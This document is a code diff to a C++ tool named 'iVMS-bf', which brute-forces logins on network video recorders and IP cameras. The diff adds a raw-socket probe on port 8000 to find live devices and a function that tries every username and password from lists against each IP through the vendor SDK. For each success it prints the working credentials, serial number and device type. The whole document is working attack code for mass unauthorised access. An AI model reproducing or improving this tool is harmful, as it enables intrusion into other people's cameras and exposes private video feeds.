@@ -9,10 +9,18 @@
 #include <mutex>
 
 #include "argp.h"
+#include "signal.h"
+#include "sys/stat.h"
+#include "sys/types.h"
+#include "sys/socket.h"
+#include "netinet/in.h"
+#include "arpa/inet.h"
+#include "unistd.h"
 
 
-#define PRINT_EVERYTHING  (options.verbosity >= 2)
-#define PRINT_RESULT      (options.verbosity >= 1)
+#define PRINT_EVERYTHING  (options.verbosity >= 3)
+#define PRINT_RESULT      (options.verbosity >= 2)
+#define PRINT_GOOD        (options.verbosity >= 1)
 
 const char *argp_program_version = "iVMS-bf 0.1 alpha";
 const char *argp_program_bug_address = "superhacker777@yandex.ru";
@@ -35,12 +43,12 @@ struct Options {
 
 static Options options = {
   1,     // Concurrency
-  1,     // Verbosity level
+  2,     // Verbosity level
   8000   // Port
 };
 
 static std::vector<std::string> logins, passwords, ips;
-static std::mutex sync;
+static std::mutex take_sync;
 
 static error_t parse_opt(int key, char *arg, struct argp_state *state) {
   if (state == NULL)
@@ -99,6 +107,130 @@ void load_data() {
   }
 }
 
+bool HPR_ping(const std::string host, const unsigned short port)
+{
+  char message[32] = {
+    0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+  };
+  char response[16] = {0};
+
+  int sock;
+  struct sockaddr_in addr;
+
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+
+  if (sock < 0)
+  {
+    std::cerr << "Can't create socket" << std::endl;
+    exit(2);
+  }
+
+  struct timeval timeout;
+  timeout.tv_sec = 3;
+  timeout.tv_usec = 0;
+
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(port);
+
+  // Accept only IPs. It should resolve host names too. LATER.
+  inet_pton(AF_INET, host.c_str(), &(addr.sin_addr));
+
+  if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)  
+    std::cerr << "Setting timeout fail" << std::endl;
+
+  if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+  {
+    if (PRINT_EVERYTHING)
+      std::cerr << "Can't connect to " << host << std::endl;
+
+    return false;
+  }
+
+  send(sock, message, sizeof(message), 0);
+  recv(sock, response, sizeof(response), 0);
+
+  close(sock);
+  
+  return ((response[3] == 0x10) && (response[7] == response[11]));
+}
+
+void brute_camera(const std::string ip)
+{
+  if (HPR_ping(ip, 8000) == false)
+  {
+    if (PRINT_EVERYTHING)
+      std::cout << ip << " is dead!" << std::endl;
+
+    return;
+  }
+
+  for (const auto &login : logins)
+  {
+    for (const auto &password : passwords)
+    {
+      if (PRINT_EVERYTHING)
+        std::cout << "Trying " << login << ":" << password << " for " << ip << "..." << std::endl;
+
+      NET_DVR_DEVICEINFO device = {0};
+
+      long user_id = NET_DVR_Login( ip.c_str(),
+                                    options.port,
+                                    login.c_str(),
+                                    password.c_str(),
+                                    &device);
+
+      // We don't need empty devices, right?
+
+      if (device.byChanNum > 0)
+      {
+        if (PRINT_GOOD)
+          std::cout << "Login success: " << login << ":" << password << "@" << ip << ", "
+                    << "channels: " << (int) device.byChanNum << ", "
+                    << "zero_channel: " << (int) device.byStartChan << ", "
+                    << "serial: \"" << device.sSerialNumber << "\", "
+                    << "DVR type: " << (int) device.byDVRType << std::endl;
+        
+        NET_DVR_Logout(user_id);
+
+        return;
+      }
+      else
+      {
+        if (PRINT_EVERYTHING)
+          std::cout << "Login failed: " << login << ":" << password << "@" << ip << std::endl;
+
+        // I'm not really sure if this shit is thread-safe or something.
+        // I hope it is.
+        // I'm a believer.
+        //
+        //                      |
+        // READ UPD DOWN THERE \ /
+        //                      V
+
+        // int error = NET_DVR_GetLastError();
+
+        // if (PRINT_EVERYTHING)
+        //   std::cout << "Login failed. Error code: " << error << std::endl;
+
+        // // We're not interested in spending our precious time watching dead cameras being dead.
+        // // There are only two *good* error codes:
+        // //
+        // //   1   — invalid credentials;
+        // //   152 — same shit for maybe newer firmwares, not really documented;
+        // //   44  — something wrong with some buffer somewhere, but it doesn't mean that camera is dead;
+
+        // if ((error != 1) && (error != 152))
+        //   goto NextPlease;
+
+        // UPD: there's no thread safety, eh.
+      }
+    }
+  }
+}
+
 void bruteforce()
 {
   while (true)
@@ -108,7 +240,7 @@ void bruteforce()
     // I'm trying to be as careful as I can be.
     // Really.
 
-    sync.lock();
+    take_sync.lock();
     
     if (!ips.empty())
     {
@@ -117,103 +249,13 @@ void bruteforce()
     }
     else
     {
-      sync.unlock();
+      take_sync.unlock();
       break;
     }
 
-    sync.unlock();
+    take_sync.unlock();
 
-
-    // TODO:
-    //   We need to make something like single RTSP ping here to detect dead cameras
-
-    for (const auto &login : logins)
-    {
-      for (const auto &password : passwords)
-      {
-        if (PRINT_EVERYTHING)
-          std::cout << "Trying " << login << ":" << password << " for " << ip << "..." << std::endl;
-
-        NET_DVR_Init();
-
-        NET_DVR_DEVICEINFO device_info;
-        device_info.byChanNum = 0;
-
-        // IP, login and password aren't const? Really?
-        char * c_ip = new char[ip.size() + 1];
-        std::copy(ip.begin(), ip.end(), c_ip);
-        c_ip[ip.size()] = '\0';
-
-        char * c_login = new char[login.size() + 1];
-        std::copy(login.begin(), login.end(), c_login);
-        c_login[login.size()] = '\0';
-
-        char * c_password = new char[password.size() + 1];
-        std::copy(password.begin(), password.end(), c_password);
-        c_password[password.size()] = '\0';
-
-        // There's no thread safety, so it's useless to save return value
-
-        NET_DVR_Login(c_ip,
-                      options.port,
-                      c_login,
-                      c_password,
-                      &device_info);
-
-        delete(c_ip);
-        delete(c_login);
-        delete(c_password);
-
-        // We're searching for channels.
-
-        bool login_success = (device_info.byChanNum > 0);
-
-        if (login_success)
-        {
-          if (PRINT_RESULT)
-            std::cout << "Login success: " << login << ":" << password << "@" << ip
-                      << "channels: " << (int) device_info.byChanNum << ", "
-                      << "zero_channel: " << (int) device_info.byStartChan << ", "
-                      << "serial: \"" << device_info.sSerialNumber << "\", "
-                      << "DVR type: " << (int) device_info.byDVRType << std::endl;
-
-          NET_DVR_Cleanup();
-          
-          goto NextPlease;
-        }
-        else
-        {
-          // I'm not really sure if this shit is thread-safe or something.
-          // I hope it is.
-          // I'm a believer.
-          //
-          //                      |
-          // READ UPD DOWN THERE \ /
-          //                      V
-
-          // int error = NET_DVR_GetLastError();
-
-          // if (PRINT_EVERYTHING)
-          //   std::cout << "Login failed. Error code: " << error << std::endl;
-
-          NET_DVR_Cleanup();
-
-          // // We're not interested in spending our precious time watching dead cameras being dead.
-          // // There are only two *good* error codes:
-          // //
-          // //   1   — invalid credentials;
-          // //   152 — same shit for maybe newer firmwares, not really documented;
-          // //   44  — something wrong with some buffer somewhere, but it doesn't mean that camera is dead;
-
-          // if ((error != 1) && (error != 152))
-          //   goto NextPlease;
-
-          // UPD: there's no thread safety, eh.
-        }
-      }
-    }
-
-NextPlease: ;
+    brute_camera(ip);
   }
 }
 
@@ -244,9 +286,13 @@ int main(int argc, char* argv[])
     return 0;
   }
 
+  NET_DVR_Init();
+
+  NET_DVR_SetRecvTimeOut(3000);
+
   spawn_threads(options.concurrency);
 
-  bruteforce();
+  NET_DVR_Cleanup();
 
   return 0;
 }
